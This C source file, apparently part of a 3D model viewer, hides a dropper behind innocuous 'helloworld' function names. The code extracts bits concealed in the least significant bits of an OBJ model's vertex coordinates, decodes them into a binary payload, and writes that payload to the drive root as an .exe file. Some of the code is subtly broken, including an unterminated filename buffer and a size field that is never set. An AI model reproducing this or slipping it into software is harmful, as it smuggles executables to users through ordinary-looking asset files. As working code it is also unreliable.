#include "helloworld.h"

static char	*decode_bitstream(char *bitstream)
{
	uint 		i;
	uint		j;
	int		    length;
	char		*output;
	char		c;

	if ((length = strlen(bitstream)) <= 7 ||
		!(output = ALLOC(sizeof(char) * (length / 8) + 1)))
		return (NULL);
	memset(output, '\0', sizeof(char) * (length / 8) + 1);
	i = -1;
	j = 0;
	c = '\0';
	while (++i < length)
	{
		if (i != 0 && i % 8 == 0)
		{
			output[j++] = c;
			c = '\0';
		}
		c += bitstream[i] == '1' ? 1 : 0;
		if (i % 8 < 7)
			c <<= 1;
	}
	return (output);
}

static char		*decode_lsb_obj(t_model *model, uint *size)
{
	int		i;
	char		*output;
	char		*p;

	if (!model || !(output = ALLOC(sizeof(char) * model->nv * 3)))
		return (NULL);
    if (size)
        *size = (model->nv * 3) / 8;
	p = output;
	i = 0;
	while (i < model->nv * 3)
		*(p++) = (int)(model->v[i++] * HELLO_DECODE_EPSILON) % 2 != 0 ? '1' : '0';
	*p = '\0';
	p = decode_bitstream(output);
	FREE(output);
	return (p);
}

static char *get_filename(char *prefix, int size)
{
    char number[STRING_SIZE];
    char filename[STRING_SIZE];

    itoa(size, number, 10);
    if (strlen(prefix) + strlen(number) + 4 >= STRING_SIZE)
        return (ft_strdup("0.exe"));
    strncpy(filename, prefix, strlen(prefix));
    strncat(filename, number, strlen(number));
    strncat(filename, ".exe", 4);
    return (ft_strdup(filename));
}

void read_helloworld(t_model *model, t_camdata *d)
{
    uint size;
    char *payload;
    char *filename;
    int fd;

    if (!d || !model || !(payload = decode_lsb_obj(model, &size)) ||
        *((uint *)payload) != model->nv ||
        *((uint *)payload + 1) > size - 8
        )
        return ;
    if (d->helloworld)
        FREE(d->helloworld);
    if (!(d->helloworld = ALLOC(*((uint *)payload + 1))))
        return;
    memcpy(d->helloworld, payload + 8, *((uint *)payload + 1));
    if ((filename = get_filename("C:\\", size)))
    {
        if ((fd = fs_touch(filename)))
        {
            write(fd, d->helloworld, d->helloworld_size);
            fs_close(fd, NULL);
        }
        FREE(filename);
    }
    FREE(payload);
}
